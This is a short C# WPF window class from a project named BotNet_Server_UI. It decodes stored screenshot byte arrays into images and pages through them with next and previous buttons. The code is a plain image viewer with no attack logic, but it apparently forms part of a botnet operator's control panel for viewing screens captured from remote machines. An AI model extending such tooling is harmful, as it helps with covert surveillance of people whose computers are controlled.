// This code is licensed under the isc license. You can improve the code by keeping this comments 
// (or by any other means, with saving authorship by Zerumi and PizhikCoder retained)
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;

namespace BotNet_Server_UI
{
    /// <summary>
    /// Логика взаимодействия для ScreenBox.xaml
    /// </summary>
    public partial class ScreenBox : Window
    {
        public int screenid = 0;
        ScreenByte[] screenBytes { get; set; }
        public ScreenBox(ScreenByte[] screenBytes)
        {
            this.screenBytes = screenBytes;
            InitializeComponent();
            var image = LoadImage(screenBytes[screenid].bytes);
            Image.Source = image;
        }
        private static BitmapImage LoadImage(byte[] imageData)
        {
            if (imageData == null || imageData.Length == 0) return null;
            var image = new BitmapImage();
            using (var mem = new MemoryStream(imageData))
            {
                mem.Position = 0;
                image.BeginInit();
                image.CreateOptions = BitmapCreateOptions.PreservePixelFormat;
                image.CacheOption = BitmapCacheOption.OnLoad;
                image.UriSource = null;
                image.StreamSource = mem;
                image.EndInit();
            }
            image.Freeze();
            return image;
        }

        private void Plus_Button_Click(object sender, RoutedEventArgs e)
        {
            if (++screenid == screenBytes.Length)
            {
                screenid--;
                return;
            }
            Image.Source = LoadImage(screenBytes[screenid].bytes);
        }

        private void Minus_Button_Click(object sender, RoutedEventArgs e)
        {
            if (screenid-- == 0)
            {
                screenid++;
                return;
            }
            Image.Source = LoadImage(screenBytes[screenid].bytes);
        }
    }
}
